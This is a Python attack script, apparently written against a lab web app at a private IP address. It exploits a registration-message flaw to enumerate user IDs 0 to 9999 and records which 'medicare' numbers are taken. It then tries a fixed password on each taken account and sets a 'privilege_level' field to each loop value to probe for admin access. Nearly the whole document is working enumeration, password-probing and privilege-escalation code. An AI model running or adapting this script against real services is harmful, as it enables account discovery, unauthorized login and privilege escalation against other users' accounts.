"""
When you attempt to log in as a user that doesn't exist, you are not informed
that they don't exist. However, when you attempt to register, you are told that
user is already taken. This script intends to exploit that, attempting to
register a wide range of user IDs, and logging which ones are already taken that
don't belong to me.
"""

import requests
import time

reg_data = {
    "first_name": "fname",
    "last_name": "lname",
    "medicare":"7",
    "password":"Password1234",
    "privilege_level":1
}

used_response = "Someone else is using this medicare number. Try again homie. <a href='javascript:history.back()''>Go back</a>"

invalid_credentials = "Username/password doesn't match homie. <a href='javascript:history.back()''>Go back</a>"

in_use = []
not_mine = []
mine = []
special = []

for i in range(0, 10000):
    reg_data["medicare"] = str(i)
    reg_data["privilege_level"] = i # just testing to see if admin is obtained
    r = requests.post("http://10.66.28.202:8231/register", reg_data)
    # if in use, record it
    if r.text == used_response:
        in_use.append(i)
    else:
        if "Access level: User" not in r.text:
            special.append(i)
    time.sleep(0.15)

for user in in_use:
    # attempt to login with Password1234
    login = {
        "medicare": user,
        "password": "Password1234"
    }
    r = requests.post("http://10.66.28.202:8230/login", login)
    if r.text == invalid_credentials:
        not_mine.append(user)
    else:
        mine.append(user)

with open("not_mine.txt", "w") as out_file:
    for user in not_mine:
        out_file.write(str(user))
        out_file.write("\n")

with open("mine.txt", "w") as out_file:
    for user in mine:
        out_file.write(str(user))
        out_file.write("\n")

with open("special.txt", "w") as out_file:
    for user in special:
        out_file.write(str(user))
        out_file.write("\n")
